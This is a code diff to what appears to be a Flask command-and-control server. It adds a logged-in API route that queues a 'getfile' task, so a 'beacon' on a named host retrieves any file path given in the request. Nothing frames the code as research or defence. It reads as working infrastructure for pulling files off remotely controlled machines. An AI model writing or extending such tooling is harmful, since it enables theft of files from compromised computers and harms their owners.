@@ -413,6 +413,20 @@ def get_browse_result(hostname):
         return jsonify(res)
     return jsonify({"error": "No browse result for this host."}), 404
 
+@app.route('/api/download/<hostname>', methods=['GET'])
+@login_required
+def download_file_from_beacon(hostname):
+    filepath = request.args.get('path')
+    if not filepath:
+        return "Missing path", 400
+    # Queue a getfile task for the beacon
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, f"getfile {filepath}",))
+    conn.commit()
+    conn.close()
+    return jsonify({"status": "queued"})
+
 
 @socketio.on('connect')
 def handle_connect():
